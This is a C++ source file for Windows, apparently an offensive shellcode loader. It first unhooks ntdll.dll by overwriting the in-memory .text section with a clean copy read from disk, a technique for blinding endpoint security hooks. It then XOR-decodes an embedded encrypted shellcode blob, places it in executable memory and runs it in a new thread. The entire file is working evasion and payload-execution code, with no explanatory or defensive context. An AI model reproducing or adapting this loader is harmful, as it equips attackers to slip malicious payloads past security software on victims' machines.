#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")

int main() {
	unsigned char shellcode[] = "\xc9\x7d\xb6\xd1\xc5\xdd\xf9\x35\x35\x35\x74\x64\x74\x65\x67"
"\x7d\x04\xe7\x50\x7d\xbe\x67\x55\x64\x63\x7d\xbe\x67\x2d\x7d"
"\xbe\x67\x15\x78\x04\xfc\x7d\x3a\x82\x7f\x7f\x7d\xbe\x47\x65"
"\x7d\x04\xf5\x99\x09\x54\x49\x37\x19\x15\x74\xf4\xfc\x38\x74"
"\x34\xf4\xd7\xd8\x67\x74\x64\x7d\xbe\x67\x15\xbe\x77\x09\x7d"
"\x34\xe5\x53\xb4\x4d\x2d\x3e\x37\x3a\xb0\x47\x35\x35\x35\xbe"
"\xb5\xbd\x35\x35\x35\x7d\xb0\xf5\x41\x52\x7d\x34\xe5\xbe\x7d"
"\x2d\x71\xbe\x75\x15\x7c\x34\xe5\x65\xd6\x63\x78\x04\xfc\x7d"
"\xca\xfc\x74\xbe\x01\xbd\x7d\x34\xe3\x7d\x04\xf5\x99\x74\xf4"
"\xfc\x38\x74\x34\xf4\x0d\xd5\x40\xc4\x79\x36\x79\x11\x3d\x70"
"\x0c\xe4\x40\xed\x6d\x71\xbe\x75\x11\x7c\x34\xe5\x53\x74\xbe"
"\x39\x7d\x71\xbe\x75\x29\x7c\x34\xe5\x74\xbe\x31\xbd\x7d\x34"
"\xe5\x74\x6d\x74\x6d\x6b\x6c\x6f\x74\x6d\x74\x6c\x74\x6f\x7d"
"\xb6\xd9\x15\x74\x67\xca\xd5\x6d\x74\x6c\x6f\x7d\xbe\x27\xdc"
"\x7e\xca\xca\xca\x68\x7c\x8b\x42\x46\x07\x6a\x06\x07\x35\x35"
"\x74\x63\x7c\xbc\xd3\x7d\xb4\xd9\x95\x34\x35\x35\x7c\xbc\xd0"
"\x7c\x89\x37\x35\x16\x1c\x3f\x35\x35\x83\x74\x61\x7c\xbc\xd1"
"\x79\xbc\xc4\x74\x8f\x79\x42\x13\x32\xca\xe0\x79\xbc\xdf\x5d"
"\x34\x34\x35\x35\x6c\x74\x8f\x1c\xb5\x5e\x35\xca\xe0\x5f\x3f"
"\x74\x6b\x65\x65\x78\x04\xfc\x78\x04\xf5\x7d\xca\xf5\x7d\xbc"
"\xf7\x7d\xca\xf5\x7d\xbc\xf4\x74\x8f\xdf\x3a\xea\xd5\xca\xe0"
"\x7d\xbc\xf2\x5f\x25\x74\x6d\x79\xbc\xd7\x7d\xbc\xcc\x74\x8f"
"\xac\x90\x41\x54\xca\xe0\xb0\xf5\x41\x3f\x7c\xca\xfb\x40\xd0"
"\xdd\xa6\x35\x35\x35\x7d\xb6\xd9\x25\x7d\xbc\xd7\x78\x04\xfc"
"\x5f\x31\x74\x6d\x7d\xbc\xcc\x74\x8f\x37\xec\xfd\x6a\xca\xe0"
"\xb6\xcd\x35\x4b\x60\x7d\xb6\xf1\x15\x6b\xbc\xc3\x5f\x75\x74"
"\x6c\x5d\x35\x25\x35\x35\x74\x6d\x7d\xbc\xc7\x7d\x04\xfc\x74"
"\x8f\x6d\x91\x66\xd0\xca\xe0\x7d\xbc\xf6\x7c\xbc\xf2\x78\x04"
"\xfc\x7c\xbc\xc5\x7d\xbc\xef\x7d\xbc\xcc\x74\x8f\x37\xec\xfd"
"\x6a\xca\xe0\xb6\xcd\x35\x48\x1d\x6d\x74\x62\x6c\x5d\x35\x75"
"\x35\x35\x74\x6d\x5f\x35\x6f\x74\x8f\x3e\x1a\x3a\x05\xca\xe0"
"\x62\x6c\x74\x8f\x40\x5b\x78\x54\xca\xe0\x7c\xca\xfb\xdc\x09"
"\xca\xca\xca\x7d\x34\xf6\x7d\x1c\xf3\x7d\xb0\xc3\x40\x81\x74"
"\xca\xd2\x6d\x5f\x35\x6c\x7c\xf2\xf7\xc5\x80\x97\x63\xca\xe0";
	
	HANDLE process = GetCurrentProcess();	
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;	
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {		
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}		
	CloseHandle(process);	
	CloseHandle(ntdllFile);	
	CloseHandle(ntdllMapping);	
	FreeLibrary(ntdllModule);
	
	//XOR de-encryption
	for(int i = 0; i < sizeof shellcode; i++) { ((char*)shellcode)[i] = (((char*)shellcode)[i]) ^ '\x35';}
	//Allocate memory buffer to hold shellcode
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//Move shellcode into memory buffer
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	//Execute shellcode
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	
	return 0;
}
